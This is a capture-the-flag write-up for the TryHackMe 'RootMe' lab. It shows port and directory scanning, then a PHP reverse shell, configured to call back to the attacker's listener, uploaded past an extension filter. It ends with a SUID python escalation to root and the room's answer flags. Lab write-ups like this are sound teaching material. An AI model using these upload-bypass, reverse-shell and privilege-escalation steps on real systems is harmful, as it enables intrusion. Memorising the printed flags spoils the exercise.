# RootMe

## Links
- Ip -> 10.10.164.87
- website -> http://10.10.164.87/
- Github Link for reverse shell-> https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
- Collection of binaries -> https://gtfobins.github.io/

## Pointers
- There is no well visible website
- No webbased attack
- noting in the dev tool

## Port Scan
```sh
└─$ sudo nmap -sS -sV -O  10.10.164.87 >> ports.txt

└─$ cat ports.txt 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-05 15:35 EDT
Nmap scan report for 10.10.164.87
Host is up (0.17s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=7/5%OT=22%CT=1%CU=35946%PV=Y%DS=5%DC=I%G=Y%TM=66884
OS:B47%P=x86_64-pc-linux-gnu)SEQ()SEQ(SP=108%GCD=1%ISR=108%TI=Z%CI=Z%II=I%T
OS:S=A)SEQ(SP=108%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=D)SEQ(SP=108%GCD=2%ISR=10
OS:9%TI=Z%CI=Z%II=I%TS=C)SEQ(SP=109%GCD=1%ISR=108%TI=Z%CI=Z%TS=A)OPS(O1=M50
OS:8ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST11NW7%O6
OS:=M508ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=N)EC
OS:N(R=Y%DF=Y%T=40%W=F507%O=M508NNSNW7%CC=Y%Q=)T1(R=N)T1(R=Y%DF=Y%T=40%S=O%
OS:A=O%F=AS%RD=0%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4
OS:(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T4(R=Y%DF=Y%T=40%W=0%S=
OS:O%A=Z%F=R%O=%RD=0%Q=)T5(R=N)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=
OS:)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=N)T6(R=Y%DF=Y%T=40%W
OS:=0%S=A%A=Z%F=R%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=O%A=Z%F=R%O=%RD=0%Q=)T7
OS:(R=N)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S
OS:=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=
OS:G%RIPCK=G%RUCK=G%RUD=G)IE(R=N)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 5 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 44.70 seconds

```
> ### Answers:`2 ports open`
> ### Answers:`2.4.29`
> ### Answers:`ssh` 


## Directory Enumeration
```sh
└─$ gobuster dir -u http://10.10.164.87/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -o directory.txt 

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.164.87/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/uploads              (Status: 301) [Size: 314] [--> http://10.10.164.87/uploads/]
/css                  (Status: 301) [Size: 310] [--> http://10.10.164.87/css/]
/js                   (Status: 301) [Size: 309] [--> http://10.10.164.87/js/]
/panel                (Status: 301) [Size: 312] [--> http://10.10.164.87/panel/]
Progress: 9813 / 87665 (11.19%)[ERROR] Get "http://10.10.164.87/0312": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 18761 / 87665 (21.40%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 18766 / 87665 (21.41%)
===============================================================
Finished
===============================================================
```
> ### Answer:`/panel/`

- If we search this directory we will find in the website there is an upload option
- and there is a upload directory as well.
- so it can be cleared that all the uploads will be store in the uploads directory
- we can check a `php reverse shell` 

## PrivEsc

- Copy the reverse shell for php from github and create a file reverse_shell.php
- then change the ip and port for the listener
```php
set_time_limit (0);
$VERSION = "1.0";
$ip = '10.17.88.30';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;


```
- Upload the file to the hidden directory upload parameter
- And after that turn on the `nc listener`
- It seems that .php extention is not working
- From some google searching I found an article

## Theory

```sh
File Upload General Methodology

Other useful extensions:

    PHP: .php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, .pht, .phtm, .phtml, .pgif, .shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module

        Working in PHPv8: .php, .php4, .php5, .phtml, .module, .inc, .hphp, .ctp

    ASP: .asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml

    Jsp: .jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action

    Coldfusion: .cfm, .cfml, .cfc, .dbm

    Flash: .swf

    Perl: .pl, .cgi

    Erlang Yaws Web Server: .yaws
```
- Lets try changing the .php with all of them
- I used .php5 and it worked `Alhumdulillah!`

## Setting the listener
```sh
nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.17.88.30] from (UNKNOWN) [10.10.164.87] 48992
Linux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 20:02:44 up 29 min,  0 users,  load average: 0.00, 0.00, 0.04
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ ls
bin
boot
cdrom
dev
etc
home

```
- go to the /uploads/ and click the reverse_shell.php5

## Finding User.txt
```sh
find / -type f -name user.txt 2> /dev/null

$ cat /var/www/user.txt
THM{y0u_g0t_a_sh3ll}

```
## Getting Root
- Search for files with SUID permission, which file is weird?
We need to run command `find / -user root -perm /4000`

```sh
$ find / -user root -perm /4000
find: '/home/rootme/.cache': Permission denied
find: '/home/rootme/.gnupg': Permission denied
find: '/home/test/.local/share': Permission denied
find: '/sys/kernel/debug': Permission denied
find: '/sys/fs/pstore': Permission denied
find: '/sys/fs/fuse/connections/49': Permission denied
find: '/run/lxcfs': Permission denied
find: '/run/sudo': Permission denied
find: '/run/cryptsetup': Permission denied
find: '/run/lvm': Permission denied
find: '/run/systemd/unit-root': Permission denied
```
- There are many
- The wired file is `/usr/bin/python` 
- In the `https://gtfobins.github.io/gtfobins/python/#suid` we found an exploit
- Now we will run them to the terminal
```python
$ python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
whoami
root
ls
bin
boot
cdrom
dev
etc
home
initrd.img
initrd.img.old
lib
lib64
lost+found
media
mnt
opt
proc
root
run
sbin
snap
srv
swap.img
sys
tmp
usr
var
vmlinuz
vmlinuz.old
cd root	 
ls
root.txt
cat root.txt
THM{pr1v1l3g3_3sc4l4t10n}

```

## Flags

##### **User**
`THM{y0u_g0t_a_sh3ll}`
##### **Root**
`THM{pr1v1l3g3_3sc4l4t10n}`

